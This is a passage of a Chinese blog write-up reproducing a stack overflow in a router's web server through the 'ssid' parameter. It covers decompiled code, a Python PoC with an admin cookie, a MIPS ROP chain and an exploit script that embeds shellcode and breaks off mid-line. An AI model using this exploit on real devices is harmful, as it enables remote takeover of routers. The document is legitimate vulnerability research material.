+<p>交叉编译，发现<strong>sub_45FA94 </strong> 调用的<strong>sub_45eb48</strong> 函数里调用了<strong>writePageParamSet</strong> 函数，不知道师傅们是怎么找到这的。ssid对应着下面的<strong>writePageParamSet(int a1, int a2, const char *a3)</strong> 第三个参数。这个函数把ssid放到一个很小的 <strong>v57</strong> 数组里</p>
+<p>来仔细分析一下这个关键函数</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删减过</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_45EB48</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  </span><br><span class="line">  _DWORD v57[<span class="number">17</span>]; <span class="comment">// [sp+CCh] [-D5Ch] BYREF</span></span><br><span class="line">  _DWORD v58[<span class="number">94</span>]; <span class="comment">// [sp+110h] [-D18h] BYREF</span></span><br><span class="line">  _BYTE v59[<span class="number">2952</span>]; <span class="comment">// [sp+288h] [-BA0h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *Env; <span class="comment">// [sp+E10h] [-18h]</span></span><br><span class="line">  <span class="type">int</span> *v61; <span class="comment">// [sp+E14h] [-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v62; <span class="comment">// [sp+E18h] [-10h]</span></span><br><span class="line">  _BYTE *v63; <span class="comment">// [sp+E1Ch] [-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v64; <span class="comment">// [sp+E20h] [-8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v65; <span class="comment">// [sp+E24h] [-4h]</span></span><br><span class="line">  swWlanWDSScan(a1, v56, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//前面的删减一部分</span></span><br><span class="line">   <span class="string">'''</span></span><br><span class="line">  <span class="comment">//根据poc的输出，这里对应着前面几次的输出</span></span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"waitWdsInf"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"siteSurveyPara"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"mptBssid"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"siteList"</span>);</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line">  </span><br><span class="line">  httpPrintf(a2, <span class="string">"0,0 );\n&lt;/SCRIPT&gt;\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v57, <span class="number">0</span>, <span class="keyword">sizeof</span>(v57));</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//取ssid对应值的指针赋给v25，然后再把ssid复制给v54</span></span><br><span class="line">  v25 = httpGetEnv(a2, <span class="string">"ssid"</span>);  </span><br><span class="line">  v26 = v25;</span><br><span class="line">  <span class="keyword">if</span> ( v25 )</span><br><span class="line">  {</span><br><span class="line">    v27 = <span class="built_in">strlen</span>(v25);</span><br><span class="line">    <span class="built_in">strncpy</span>(v57, v26, v27);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    HIBYTE(v57[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//下面的这几段是对应着wlanconfig的值</span></span><br><span class="line">  v28 = httpGetEnv(a2, <span class="string">"curRegion"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v28 )</span><br><span class="line">  {</span><br><span class="line">    v29 = atoi(v28);</span><br><span class="line">    i = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 &lt; <span class="number">0x6C</span> )</span><br><span class="line">      v57[<span class="number">9</span>] = v29;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">9</span>] = <span class="number">17</span>;</span><br><span class="line">  }</span><br><span class="line">  v30 = httpGetEnv(a2, <span class="string">"channel"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v30 )</span><br><span class="line">  {</span><br><span class="line">    v31 = atoi(v30);</span><br><span class="line">    i = v31;</span><br><span class="line">    <span class="keyword">if</span> ( !a1 &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(v31 - <span class="number">1</span>) &lt; <span class="number">0xF</span> )</span><br><span class="line">      v57[<span class="number">10</span>] = v31;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a1 )</span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">10</span>] = <span class="number">6</span>;</span><br><span class="line">  }</span><br><span class="line">  v32 = httpGetEnv(a2, <span class="string">"chanWidth"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v32 )</span><br><span class="line">  {</span><br><span class="line">    v33 = atoi(v32);</span><br><span class="line">    i = v33;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v33 - <span class="number">1</span>) &lt; <span class="number">3</span> )</span><br><span class="line">      v57[<span class="number">11</span>] = v33;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">11</span>] = <span class="number">2</span>;</span><br><span class="line">  }</span><br><span class="line">  v34 = httpGetEnv(a2, <span class="string">"mode"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">  {</span><br><span class="line">    v35 = atoi(v34);</span><br><span class="line">    i = v35;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v35 - <span class="number">1</span>) &lt; <span class="number">8</span> )</span><br><span class="line">      v57[<span class="number">12</span>] = v35;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">12</span>] = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//下面的值不用设置，不然产生\x00截断</span></span><br><span class="line">  v36 = httpGetEnv(a2, <span class="string">"wrr"</span>);</span><br><span class="line">  v37 = v36;</span><br><span class="line">  <span class="keyword">if</span> ( v36 )</span><br><span class="line">    v57[<span class="number">13</span>] = !<span class="built_in">strcmp</span>(v36, <span class="string">"true"</span>) || atoi(v37) == <span class="number">1</span>;</span><br><span class="line">  v38 = httpGetEnv(a2, <span class="string">"sb"</span>);</span><br><span class="line">  v39 = v38;</span><br><span class="line">  <span class="keyword">if</span> ( v38 )</span><br><span class="line">    v57[<span class="number">14</span>] = !<span class="built_in">strcmp</span>(v38, <span class="string">"true"</span>) || atoi(v39) == <span class="number">1</span>;</span><br><span class="line">  v40 = httpGetEnv(a2, <span class="string">"select"</span>);</span><br><span class="line">  v41 = v40;</span><br><span class="line">  <span class="keyword">if</span> ( v40 )</span><br><span class="line">    v57[<span class="number">15</span>] = !<span class="built_in">strcmp</span>(v40, <span class="string">"true"</span>) || atoi(v41) == <span class="number">1</span>;</span><br><span class="line">  v42 = httpGetEnv(a2, <span class="string">"rate"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">    v57[<span class="number">16</span>] = atoi(v42);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"pagePara"</span>);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"\"%s\","</span>, (<span class="type">const</span> <span class="type">char</span> *)v57);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">9</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">10</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">11</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">12</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">13</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">14</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">15</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">16</span>]);</span><br><span class="line">  httpPrintf(a2, <span class="string">"0,0 );\n&lt;/SCRIPT&gt;\n"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;script language=JavaScript&gt;\nvar isInScanning = 0;\n&lt;/script&gt;"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v50 &lt; <span class="number">9</span> &amp;&amp; ((<span class="number">1</span> &lt;&lt; v50) &amp; <span class="number">0x1C8</span>) != <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    HttpWebV4Head(a2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v10 = <span class="string">"/userRpm/popupSiteSurveyRpm_AP.htm"</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    HttpWebV4Head(a2, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    v10 = <span class="string">"/userRpm/popupSiteSurveyRpm.htm"</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_97:</span><br><span class="line">  <span class="keyword">if</span> ( httpRpmFsA(a2, v10) != <span class="number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v5 = HttpErrorPage(a2, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> v5 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>根据poc的输出捋了一下</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241212171551271.png" alt="image-20241212171551271"></p>
+<p>根据函数画了ssid几个参数在栈上的位置</p>
+<p>v57数组是dword，32位MIPS程序中占四个字节</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> |</span><br><span class="line">     |   ssid</span><br><span class="line">     |   </span><br><span class="line"><span class="number">0x24</span> |   curRegion</span><br><span class="line"><span class="number">0x28</span> |   channel</span><br><span class="line"><span class="number">0x2c</span> |   chanWidth</span><br><span class="line"><span class="number">0x30</span> |   mode</span><br><span class="line"><span class="number">0x34</span> |   wrr   <span class="comment">//从wrr开始下面的值不用设置,找不到就不会设为默认值0x1产生截断</span></span><br><span class="line"><span class="string">'  '</span> '</span><br></pre></td></tr></tbody></table></figure>
+<p>至于为什么把ssid复制给v57,后面的参数再在v57上赋值没有改变ssid的输出不是很理解，ssid理论上是被后面赋值的参数覆盖一部分的</p>
+<p>poc</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">default_socket = socket.socket</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">path,cookie</span>):</span><br><span class="line">    headers = {</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"</span>,</span><br><span class="line">                <span class="string">"Cookie"</span>:<span class="string">"Authorization=Basic{cookie}"</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))}</span><br><span class="line">    payload=<span class="string">"/%0A"</span>*<span class="number">0x55</span> + <span class="string">"abcdefghijklmn"</span>+<span class="string">"\x78\x56\x34\x12"</span></span><br><span class="line">    <span class="comment">#这是字典设置了对应几个参数的值</span></span><br><span class="line">    params = {</span><br><span class="line">        <span class="string">"mode"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"curRegion"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"chanWidth"</span>:<span class="string">"100"</span>,</span><br><span class="line">                <span class="string">"channel"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"ssid"</span>:urllib.request.unquote(payload) <span class="comment">#if python3</span></span><br><span class="line">                                      <span class="comment">#urllib.unquote(payload) #if python2 (suggest)</span></span><br><span class="line">        }</span><br><span class="line">    url=<span class="string">"http://192.168.208.150:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm"</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line">    <span class="built_in">print</span>(params)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">"NRLABRHBAIESYOKA"</span>,<span class="string">"%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"</span>)</span><br></pre></td></tr></tbody></table></figure>
+<p>gdb下不了断点，暂时看不到被覆盖的寄存器</p>
+<p>在 <strong>writePageParamSet</strong> 调用了<strong>stringModify</strong>函数，使其发生栈溢出，函数的结尾，lw了四个寄存器，可以劫持函数的执行流</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241212172752316.png" alt="image-20241212172752316"></p>
+<p>大端序</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/t0118f33322ff3a12cd.png" alt="img"></p>
+<p>由于调试不了stringModify函数的前后，借鉴师傅们的博客算得的sp的偏移是</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp偏移：<span class="string">'/%0a'</span>*<span class="number">0x55</span>+<span class="number">2</span>+s0+s1+s2+ra</span><br><span class="line">payload=<span class="string">'/%0a'</span>*<span class="number">0x55</span>+<span class="number">2</span>  //经转移后长度是<span class="number">0x200</span></span><br><span class="line">payload+=s0+s1+s2</span><br><span class="line">payload+=ra</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h5><p>由于是mips程序所以栈是可执行的，并且该程序是大端序</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241212192812056.png" alt="image-20241212192812056"></p>
+<p>由于mips程序的指令集有<strong>（cache incoherency)缓存不一致性</strong>,branch delay slot机制使汇编不是按一条直线进行下去，后续会补充，指令cache和数据cache需要一个时间同步，需要调用sleep让shellcode从数据cache刷新到指令cache。需要构造rop，寻找gadgets，大概的流程图如下，mipsrop的构建参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/179510#h2-4">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析-安全客 - 安全资讯平台</a></p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/t018531348163a399e1.png" alt="image_1d96hgnfq134b1ekt12kd142q3pom.png-32.6kB"></p>
+<p><strong>gadget1</strong>，修改寄存器$a0,$a0作为sleep函数的参数。</p>
+<p>同时当作溢出时$ra寄存器的值，作为返回地址，跳转到$s1</p>
+<p>s1=gadget2</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000E204                 move    $t9, $s1</span><br><span class="line">LOAD:0000E208                 jalr    $t9 ; sysconf</span><br><span class="line">LOAD:0000E20C                 li      $a0, 3</span><br></pre></td></tr></tbody></table></figure>
+<p>gadget2，把$s2寄存器的存的地址赋给$t9并执行，这里写的是sleep函数的地址，下面还会把sp偏移的几个地址的值lw给各个寄存器，所以这里要设置好各个寄存器的值，最后会$sp的值会加0x28,返回执行ra寄存器的存的地址，这里ra寄存器设置的是gadget3的地址。</p>
+<p>那么此时栈溢出时设置的s0几个寄存器的值和执行gadget2前的几个寄存器的值在栈上应该是这样</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#padding,刚溢出时</span></span><br><span class="line">s0=<span class="number">0x11111111</span></span><br><span class="line">s1=gadget2</span><br><span class="line">s2=fuc_sleep</span><br><span class="line">ra=gadget1     <span class="comment">#先执行ra，gadget1</span></span><br><span class="line"><span class="comment">#在执行gadget2前，预设好后面设置的寄存的值</span></span><br><span class="line"><span class="comment">#执行gadget2时的sp</span></span><br><span class="line"><span class="string">'a'</span>*<span class="number">0x1c</span>           </span><br><span class="line">s1=gadget4      <span class="comment"># 0x28+var_C($sp)</span></span><br><span class="line">s2=<span class="number">0x22222222</span></span><br><span class="line">ra=gadget3      <span class="comment"># 0x28+var_4($sp)</span></span><br><span class="line"><span class="comment">#执行完gadget2后，addiu  $+sp, 0x28 ，sp会在这个位置 </span></span><br><span class="line"><span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">shellcode       <span class="comment">#gadget3 addiu $a1, $sp, 0x168+var_150,把shellcode的地址$a1</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>gadget2</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00037470                 move    $t9, $s2</span><br><span class="line">LOAD:00037474                 lw      $ra, 0x28+var_4($sp)</span><br><span class="line">LOAD:00037478                 lw      $s2, 0x28+var_8($sp)</span><br><span class="line">LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)</span><br><span class="line">LOAD:00037480                 lw      $s0, 0x28+var_10($sp)</span><br><span class="line">LOAD:00037484</span><br><span class="line">LOAD:00037484 loc_37484:                               # DATA XREF: xdr_callhdr↓o</span><br><span class="line">LOAD:00037484                 jr      $t9 ; xdr_opaque_auth</span><br><span class="line">LOAD:00037488                 addiu   $sp, 0x28</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>gadget3</strong>，把sp+0x18的地址给$a1,sp+0x18的地址写上shellcode,然后跳转到$s1寄存器去执行，毫无疑问$s1写的就是gadget4的地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150</span><br><span class="line">LOAD:0000E908                 move    $t9, $s1</span><br><span class="line">LOAD:0000E90C                 jalr    $t9 ; stat64</span><br><span class="line">LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>gadget4</strong>，执行$a1存的地址，即shellcode的地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000374D8                 move    $t9, $a1</span><br><span class="line">LOAD:000374DC                 sw      $v0, 0x4C($a0)</span><br><span class="line">LOAD:000374E0                 move    $a1, $a2</span><br><span class="line">LOAD:000374E4                 jr      $t9</span><br><span class="line">LOAD:000374E8                 addiu   $a0, 0x4C  # 'L'</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>shellcode</strong></p>
+<p>由于指令<strong>lui</strong> 的字节码是0x3c(&lt;),会被转义，一种方式是指令逃逸，另一种是指令替换，参考师傅们的链接</p>
+<p><a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/files/shellcode-794.php">http://shell-storm.org/shellcode/files/shellcode-794.php</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45541">https://www.exploit-db.com/exploits/45541</a></p>
+<p><strong>指令替换</strong></p>
+<p>可以使用一些无关指令，如使用 <strong>ori t3,t3,0xff3c</strong> 时，<strong>3c(&lt;)</strong> 经过<strong>stringModify</strong> 函数会被编码为 <strong>\ &lt; (\x5c\x3c) </strong>,\x5c是反斜杠,  <strong>ori t3,t3,0xff3c</strong> 的汇编字节码为 <strong>‘\x35\x6b\xff\x3c’</strong> ,经转义后是 <strong>‘\x35\x6b\xff\x5c’</strong> ,\x3c就逃逸到下一个内存空间，这个3c就可以继续使用了，对于其他被转义的字符 <code>/ &gt;  &lt;  \\  "</code> 也是如此 </p>
+<p>也就是 \x2f , \x3c,\x3e,\x5c,\x22</p>
+<p><strong>关于gdb的调试，需要自己编译gdb上传到qemu中</strong> </p>
+<p><strong>exp</strong></p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">default_socket=socket.socket</span><br><span class="line">socket.socket=socks.socksocket</span><br><span class="line">session=requests.Session()</span><br><span class="line">session.verify=<span class="literal">False</span></span><br><span class="line">context.endian=<span class="string">'big'</span></span><br><span class="line">libc_base=<span class="number">0x77fe2000</span></span><br><span class="line">sleep=<span class="number">0x53ac0</span></span><br><span class="line">g1=<span class="number">0x000E204</span></span><br><span class="line">g2=<span class="number">0x00037470</span></span><br><span class="line">g3=<span class="number">0x0000E904</span></span><br><span class="line">g4=<span class="number">0x00374D8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b"\x24\x0e\xff\xfd\x01\xc0\x20\x27\x01\xc0\x28\x27\x28\x06\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x34\x0e\xff\xff\x01\xc0\x70\x27\xaf\xae\xff\xf6\xaf\xae\xff\xf4"</span></span><br><span class="line">shellcode+=<span class="string">b"\x34\x0f\xd8\xf0\x01\xe0\x78\x27\xaf\xaf\xff\xf2\x34\x0f\xff\xfd"</span></span><br><span class="line">shellcode+=<span 